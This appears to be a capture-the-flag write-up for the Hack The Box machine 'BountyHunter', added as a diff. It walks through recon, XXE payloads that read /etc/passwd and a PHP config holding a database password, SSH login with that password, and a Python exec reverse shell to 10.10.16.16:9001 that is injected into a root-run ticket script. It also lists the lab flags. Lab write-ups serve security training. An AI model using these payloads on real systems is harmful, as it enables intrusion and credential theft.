@@ -1,0 +1,179 @@
+BountyHunter | HTB | 10.10.11.100
+
+Nmap Scripts
+------------
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+
+Gobuster Scan
+-------------
+/.hta                 (Status: 403) [Size: 277]
+/.hta.php             (Status: 403) [Size: 277]
+/.htaccess            (Status: 403) [Size: 277]
+/.htpasswd            (Status: 403) [Size: 277]
+/.htaccess.php        (Status: 403) [Size: 277]
+/.htpasswd.php        (Status: 403) [Size: 277]
+/assets               (Status: 301) [Size: 313] [--> http://10.10.11.100/assets/]
+/css                  (Status: 301) [Size: 310] [--> http://10.10.11.100/css/]   
+/db.php               (Status: 200) [Size: 0]                                    
+/index.php            (Status: 200) [Size: 25169]                                
+/index.php            (Status: 200) [Size: 25169]                                
+/js                   (Status: 301) [Size: 309] [--> http://10.10.11.100/js/]    
+/portal.php           (Status: 200) [Size: 125]                                  
+/resources            (Status: 301) [Size: 316] [--> http://10.10.11.100/resources/]
+/server-status        (Status: 403) [Size: 277]                              
+
+* visiting the portal.php takes to another page and we have a basic bug report page with a few fields 
+* fill out the fields and intercept the requests with burp suite ans we can see that its using POST method to get a base64,url encoded string using the parameter data
+* encoding the string gives us a xml code 
+* this was a XML Ethernal Entity (XXE), which means the application parses XML input. Let’s check if it allows XML entities.
+* using this payload to check for the vulnerability
+
+	<?xml  version="1.0" encoding="ISO-8859-1"?>
+	<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
+  		<bugreport>
+  		<title>test</title>
+  		<cwe>test</cwe>
+  		<cvss>test</cvss>
+  		<reward>&example;</reward>
+  		</bugreport> 
+
+* base64 url encode the code and pass it through the burp suite to check for the vulnerability 
+
+POST /tracker_diRbPr00f314.php HTTP/1.1
+Host: 10.10.11.100
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 301
+Origin: http://10.10.11.100
+Connection: close
+Referer: http://10.10.11.100/log_submit.php
+
+data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIHJlcGxhY2UgWzwhRU5USVRZIGV4YW1wbGUgIkRvZSI%2BIF0%2BCiAgPGJ1Z3JlcG9ydD4KICA8dGl0bGU%2BdGVzdDwvdGl0bGU%2BCiAgPGN3ZT50ZXN0PC9jd2U%2BCiAgPGN2c3M%2BdGVzdDwvY3Zzcz4KICA8cmV3YXJkPiZleGFtcGxlOzwvcmV3YXJkPgogIDwvYnVncmVwb3J0Pg%3D%3D
+
+Reward:</td>
+    <td>Doe</td>
+  </tr>
+</table>
+
+* we have a hit 
+* now since we have confirmed that the machine is vulnerable to XXE we can do malicious things using this vulnerability
+* using this payload to grab the /etc/passwd file from the machine 
+
+<?xml  version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE data [
+<!ENTITY file SYSTEM "file:///etc/passwd"> 
+]>
+  <bugreport>
+  <title>test</title>
+  <cwe>test</cwe>
+  <cvss>test</cvss>
+  <reward>&file;</reward>
+  </bugreport>
+
+ * and we have the result for this as 
+
+ 	root:x:0:0:root:/root:/bin/bash
+	daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+	bin:x:2:2:bin:/bin:/usr/sbin/nologin
+	sys:x:3:3:sys:/dev:/usr/sbin/nologin
+	sync:x:4:65534:sync:/bin:/bin/sync
+	games:x:5:60:games:/usr/games:/usr/sbin/nologin
+	man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+	lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+	mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+	news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+	uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+	proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+	www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+	backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+	list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+	irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+	gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+	nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+	systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+	systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+	systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+	messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+	syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+	_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+	tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+	uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+	tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+	landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+	pollinate:x:110:1::/var/cache/pollinate:/bin/false
+	sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
+	systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+	development:x:1000:1000:Development:/home/development:/bin/bash
+	lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+	usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+
+* now we have the username of a valid privileged use in the box 
+	development:x:1000:1000:Development:/home/development:/bin/bash
+
+* using this payload to read the db.php file we found before 
+
+	<?xml  version="1.0" encoding="ISO-8859-1"?>
+	<!DOCTYPE replace [
+	<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php"> 
+	]>
+	  <bugreport>
+	  <title>test</title>
+	  <cwe>test</cwe>
+	  <cvss>test</cvss>
+	  <reward>&xxe;</reward>
+	  </bugreport>
+
+* and we get this 
+
+	  PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=
+
+* decoding it with url-encode and base64, and we get
+	<?php
+	// TODO -> Implement login system with the database.
+	$dbserver = "localhost";
+	$dbname = "bounty";
+	$dbusername = "admin";
+	$dbpassword = "m19RoAU0hP41A1sTsq6K";
+	$testuser = "test";
+	?>
+
+* we have the password for the database 
+
+	m19RoAU0hP41A1sTsq6K
+
+* tryied the password with the username we got before to login via ssh into the machine and succeeded
+
+	development : m19RoAU0hP41A1sTsq6K
+
+* now we have a shell
+* grab the user.txt
+	
+-------------------------------------------	
+user.txt : be31dc601d9c6e9c384aa7a70a3e21dd
+-------------------------------------------
+
+Priv-esc
+--------
+* sudo -l and we can see a python file which we can run as root
+* checking the file reveals its a ticket checking file which has a number of tests to check if thr filr is valid or not 
+* /temp has a file names root.md which is taken as the input file for the script
+* edit the file and we can see that it can execute a python commands
+* everything comes after the and will be executed 
+* insert a reverse shell after and and setup a nc listener 
+* run the scripts with appropriate inputs  
+
+# Skytrain Inc   
+  ## Ticket to root  
+  __Ticket Code:__  
+  **102+ 10 == 112 and exec('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.16",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])')
+
+* and we are root 
+
+-------------------------------------------
+root.txt : afb73369018b235c2514e74b0d64b0ab
+-------------------------------------------
